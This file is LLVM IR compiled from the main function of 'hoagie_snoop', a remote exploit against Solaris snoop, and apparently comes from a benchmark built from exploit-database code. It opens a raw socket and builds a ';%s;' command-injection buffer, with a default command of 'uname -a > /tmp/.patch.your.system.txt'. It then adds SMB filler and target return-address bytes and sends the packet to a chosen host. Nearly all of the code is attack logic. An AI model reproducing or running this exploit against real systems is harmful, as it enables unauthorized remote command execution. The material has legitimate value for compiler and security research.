; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_6328.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_6328.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i8*, i32 }
%struct.sockaddr_in = type { %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }

@SMB_TARGET_DEFAULT = common dso_local global i8* null, align 8
@SMB_PORT_DEFAULT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [56 x i8] c"hoagie_snoop.c - solaris snoop remote\0A-andi / void.at\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [13 x i8] c"hvt:p:r:i:c:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [38 x i8] c"[*] unknown command line option '%c'\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [33 x i8] c"[*] failed to create raw socket\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [39 x i8] c"uname -a > /tmp/.patch.your.system.txt\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"[*] attacking '%s' on '%s' ...\0A\00", align 1
@targets = common dso_local global %struct.TYPE_4__* null, align 8
@.str.6 = private unnamed_addr constant [5 x i8] c";%s;\00", align 1
@SMB_HEADER_FILLER = common dso_local global i8 0, align 1
@.str.7 = private unnamed_addr constant [26 x i8] c"[*] execute '%s' now ...\0A\00", align 1
@SMB_COMMAND_TRIGGER = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [10 x i8] c"[*] done\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca i32, align 4
  %12 = alloca [1024 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i8*, i8** @SMB_TARGET_DEFAULT, align 8
  store i8* %15, i8** %7, align 8
  %16 = load i32, i32* @SMB_PORT_DEFAULT, align 4
  store i32 %16, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %13, align 4
  store i8* null, i8** %14, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str, i64 0, i64 0))
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 2
  br i1 %19, label %20, label %24

20:                                               ; preds = %2
  %21 = load i32, i32* %4, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = call i32 @usage(i32 %21, i8** %22)
  br label %53

24:                                               ; preds = %2
  br label %25

25:                                               ; preds = %51, %24
  %26 = load i32, i32* %4, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = call signext i8 @getopt(i32 %26, i8** %27, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0))
  store i8 %28, i8* %6, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8, i8* @EOF, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp ne i32 %29, %31
  br i1 %32, label %33, label %52

33:                                               ; preds = %25
  %34 = load i8, i8* %6, align 1
  %35 = sext i8 %34 to i32
  switch i32 %35, label %46 [
    i32 116, label %36
    i32 112, label %38
    i32 105, label %41
    i32 99, label %44
  ]

36:                                               ; preds = %33
  %37 = load i8*, i8** @optarg, align 8
  store i8* %37, i8** %7, align 8
  br label %51

38:                                               ; preds = %33
  %39 = load i8*, i8** @optarg, align 8
  %40 = call i32 @atoi(i8* %39)
  store i32 %40, i32* %8, align 4
  br label %51

41:                                               ; preds = %33
  %42 = load i8*, i8** @optarg, align 8
  %43 = call i32 @atoi(i8* %42)
  store i32 %43, i32* %13, align 4
  br label %51

44:                                               ; preds = %33
  %45 = load i8*, i8** @optarg, align 8
  store i8* %45, i8** %14, align 8
  br label %51

46:                                               ; preds = %33
  %47 = load i8, i8* %6, align 1
  %48 = sext i8 %47 to i32
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0), i32 %48)
  %50 = call i32 @exit(i32 -1) #3
  unreachable

51:                                               ; preds = %44, %41, %38, %36
  br label %25

52:                                               ; preds = %25
  br label %53

53:                                               ; preds = %52, %20
  %54 = load i32, i32* @PF_INET, align 4
  %55 = load i32, i32* @SOCK_RAW, align 4
  %56 = load i32, i32* @IPPROTO_TCP, align 4
  %57 = call i32 @socket(i32 %54, i32 %55, i32 %56)
  store i32 %57, i32* %9, align 4
  %58 = load i32, i32* %9, align 4
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %62

60:                                               ; preds = %53
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  br label %241

62:                                               ; preds = %53
  %63 = load i32, i32* @AF_INET, align 4
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %63, i32* %64, align 4
  %65 = load i32, i32* %8, align 4
  %66 = call i32 @htons(i32 %65)
  %67 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %66, i32* %67, align 4
  %68 = load i8*, i8** %7, align 8
  %69 = call i32 @inet_addr(i8* %68)
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %71 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %70, i32 0, i32 0
  store i32 %69, i32* %71, align 4
  %72 = load i8*, i8** %14, align 8
  %73 = icmp ne i8* %72, null
  br i1 %73, label %75, label %74

74:                                               ; preds = %62
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.4, i64 0, i64 0), i8** %14, align 8
  br label %75

75:                                               ; preds = %74, %62
  %76 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %77 = load i32, i32* %13, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %76, i64 %78
  %80 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %79, i32 0, i32 0
  %81 = load i8*, i8** %80, align 8
  %82 = load i8*, i8** %7, align 8
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0), i8* %81, i8* %82)
  %84 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %85 = load i8*, i8** %14, align 8
  %86 = call i32 @snprintf(i8* %84, i32 1024, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* %85)
  %87 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %88 = call i32 @strlen(i8* %87)
  store i32 %88, i32* %11, align 4
  br label %89

89:                                               ; preds = %97, %75
  %90 = load i32, i32* %11, align 4
  %91 = icmp slt i32 %90, 256
  br i1 %91, label %92, label %100

92:                                               ; preds = %89
  %93 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %94 = load i32, i32* %11, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %95
  store i8 %93, i8* %96, align 1
  br label %97

97:                                               ; preds = %92
  %98 = load i32, i32* %11, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %11, align 4
  br label %89

100:                                              ; preds = %89
  %101 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %102 = load i32, i32* %11, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %11, align 4
  %104 = sext i32 %102 to i64
  %105 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %104
  store i8 %101, i8* %105, align 1
  %106 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %107 = load i32, i32* %11, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %11, align 4
  %109 = sext i32 %107 to i64
  %110 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %109
  store i8 %106, i8* %110, align 1
  %111 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %112 = load i32, i32* %11, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %11, align 4
  %114 = sext i32 %112 to i64
  %115 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %114
  store i8 %111, i8* %115, align 1
  %116 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %117 = load i32, i32* %11, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %11, align 4
  %119 = sext i32 %117 to i64
  %120 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %119
  store i8 %116, i8* %120, align 1
  %121 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %122 = load i32, i32* %11, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %11, align 4
  %124 = sext i32 %122 to i64
  %125 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %124
  store i8 %121, i8* %125, align 1
  %126 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %127 = load i32, i32* %11, align 4
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %11, align 4
  %129 = sext i32 %127 to i64
  %130 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %129
  store i8 %126, i8* %130, align 1
  %131 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %132 = load i32, i32* %11, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %11, align 4
  %134 = sext i32 %132 to i64
  %135 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %134
  store i8 %131, i8* %135, align 1
  %136 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %137 = load i32, i32* %11, align 4
  %138 = add nsw i32 %137, 1
  store i32 %138, i32* %11, align 4
  %139 = sext i32 %137 to i64
  %140 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %139
  store i8 %136, i8* %140, align 1
  %141 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  %144 = sext i32 %142 to i64
  %145 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %144
  store i8 %141, i8* %145, align 1
  %146 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %147 = load i32, i32* %11, align 4
  %148 = add nsw i32 %147, 1
  store i32 %148, i32* %11, align 4
  %149 = sext i32 %147 to i64
  %150 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %149
  store i8 %146, i8* %150, align 1
  %151 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %152 = load i32, i32* %11, align 4
  %153 = add nsw i32 %152, 1
  store i32 %153, i32* %11, align 4
  %154 = sext i32 %152 to i64
  %155 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %154
  store i8 %151, i8* %155, align 1
  %156 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %157 = load i32, i32* %11, align 4
  %158 = add nsw i32 %157, 1
  store i32 %158, i32* %11, align 4
  %159 = sext i32 %157 to i64
  %160 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %159
  store i8 %156, i8* %160, align 1
  %161 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %162 = load i32, i32* %11, align 4
  %163 = add nsw i32 %162, 1
  store i32 %163, i32* %11, align 4
  %164 = sext i32 %162 to i64
  %165 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %164
  store i8 %161, i8* %165, align 1
  %166 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %167 = load i32, i32* %11, align 4
  %168 = add nsw i32 %167, 1
  store i32 %168, i32* %11, align 4
  %169 = sext i32 %167 to i64
  %170 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %169
  store i8 %166, i8* %170, align 1
  %171 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %172 = load i32, i32* %11, align 4
  %173 = add nsw i32 %172, 1
  store i32 %173, i32* %11, align 4
  %174 = sext i32 %172 to i64
  %175 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %174
  store i8 %171, i8* %175, align 1
  %176 = load i8, i8* @SMB_HEADER_FILLER, align 1
  %177 = load i32, i32* %11, align 4
  %178 = add nsw i32 %177, 1
  store i32 %178, i32* %11, align 4
  %179 = sext i32 %177 to i64
  %180 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %179
  store i8 %176, i8* %180, align 1
  %181 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %182 = load i32, i32* %13, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %181, i64 %183
  %185 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %184, i32 0, i32 1
  %186 = load i32, i32* %185, align 8
  %187 = and i32 %186, 255
  %188 = trunc i32 %187 to i8
  %189 = load i32, i32* %11, align 4
  %190 = add nsw i32 %189, 1
  store i32 %190, i32* %11, align 4
  %191 = sext i32 %189 to i64
  %192 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %191
  store i8 %188, i8* %192, align 1
  %193 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %194 = load i32, i32* %13, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %193, i64 %195
  %197 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %196, i32 0, i32 1
  %198 = load i32, i32* %197, align 8
  %199 = ashr i32 %198, 8
  %200 = and i32 %199, 255
  %201 = trunc i32 %200 to i8
  %202 = load i32, i32* %11, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %11, align 4
  %204 = sext i32 %202 to i64
  %205 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %204
  store i8 %201, i8* %205, align 1
  %206 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %207 = load i32, i32* %13, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %206, i64 %208
  %210 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %209, i32 0, i32 1
  %211 = load i32, i32* %210, align 8
  %212 = ashr i32 %211, 16
  %213 = and i32 %212, 255
  %214 = trunc i32 %213 to i8
  %215 = load i32, i32* %11, align 4
  %216 = add nsw i32 %215, 1
  store i32 %216, i32* %11, align 4
  %217 = sext i32 %215 to i64
  %218 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %217
  store i8 %214, i8* %218, align 1
  %219 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %220 = load i32, i32* %13, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %219, i64 %221
  %223 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %222, i32 0, i32 1
  %224 = load i32, i32* %223, align 8
  %225 = ashr i32 %224, 24
  %226 = and i32 %225, 255
  %227 = trunc i32 %226 to i8
  %228 = load i32, i32* %11, align 4
  %229 = add nsw i32 %228, 1
  store i32 %229, i32* %11, align 4
  %230 = sext i32 %228 to i64
  %231 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 %230
  store i8 %227, i8* %231, align 1
  %232 = load i8*, i8** %14, align 8
  %233 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0), i8* %232)
  %234 = load i32, i32* %9, align 4
  %235 = load i32, i32* @SMB_COMMAND_TRIGGER, align 4
  %236 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %237 = call i32 @send_smb_packet(i32 %234, %struct.sockaddr_in* %10, i32 %235, i8* %236)
  %238 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  %239 = load i32, i32* %9, align 4
  %240 = call i32 @close(i32 %239)
  br label %241

241:                                              ; preds = %100, %60
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @usage(i32, i8**) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @send_smb_packet(i32, %struct.sockaddr_in*, i32, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
